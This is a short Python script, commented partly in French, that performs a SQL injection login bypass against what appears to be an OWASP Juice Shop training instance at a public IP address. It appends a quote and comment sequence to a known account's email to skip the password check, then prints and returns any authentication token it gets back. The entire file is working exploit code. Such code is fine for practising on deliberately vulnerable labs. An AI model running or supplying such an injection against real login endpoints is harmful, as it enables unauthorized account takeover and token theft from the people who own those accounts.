import requests

def simulate_sql_injection(url, username):
    """
    :param url: L'URL of API endpoint to test.
    :param username: username for SQL injection.
    :return: authentification token if it worked, else None.
    """
    payload = f"{username}'--"

    try:
        
        response = requests.post(url, data={'email': payload, 'password': 'password'})

        print(f"Request status: {response.status_code}")
        print(f"Response:\n{response.text}")

        # Extraction du token d'authentification si présent
        try:
            token = response.json().get("authentication", {}).get("token", None)
            if token:
                print(f"Token: {token}")
                return token
            else:
                print("No token auth")
                return None
        except ValueError:
            print("Response not in JSON format")
            return None

    except requests.RequestException as e:
       print("Error", f"Request error : {e}")
       return None

if __name__ == "__main__":
    target_url = "http://45.76.47.218:3000/rest/user/login"
    username_input = "mc.safesearch@juice-sh.op"

    auth_token = simulate_sql_injection(target_url, username_input)